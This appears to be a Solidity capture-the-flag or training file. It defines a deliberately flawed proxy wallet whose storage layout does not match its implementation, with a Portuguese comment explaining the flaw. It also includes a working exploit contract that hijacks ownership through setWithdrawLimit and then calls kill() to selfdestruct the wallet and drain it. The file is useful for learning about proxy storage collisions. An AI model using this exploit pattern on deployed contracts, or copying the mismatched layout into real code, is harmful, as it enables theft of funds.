// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract BurnerWallet {
    address public implementation;
    //EXPLOIT: faltou declarar limit, dessa forma quando o contrato utilizar setWithdrawLimit() irá, na verdade, atualizar o owner
    address payable public owner;

    constructor(address _implementation) {
        implementation = _implementation;
        owner = payable(msg.sender);
    }

    fallback() external payable {
        (bool executed, ) = implementation.delegatecall(msg.data);
        require(executed, "failed");
    }

    function kill() external {
        require(msg.sender == owner, "not owner");
        selfdestruct(owner);
    }
}

contract BurnerWalletImplementation {
    address public implementation;
    uint256 public limit;
    address payable public owner;

    receive() external payable {}

    modifier onlyOwner() {
        require(msg.sender == owner, "!owner");
        _;
    }

    function setWithdrawLimit(uint256 _limit) external {
        limit = _limit;
    }

    function withdraw() external onlyOwner {
        uint256 amount = address(this).balance;
        if (amount > limit) {
            amount = limit;
        }
        owner.transfer(amount);
    }
}


interface IBurnerWallet {
    function setWithdrawLimit(uint256 limit) external;
    function kill() external;
}

contract BurnerWalletExploit {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function pwn() external {
        IBurnerWallet(target).setWithdrawLimit(uint256(uint160(address(this))));
        IBurnerWallet(target).kill();

        // target.call(abi.encodeWithSignature("setWithdrawLimit(uint256)", uint256(uint160(address(this)))));
        // target.call(abi.encodeWithSignature("kill()"));
    }
}
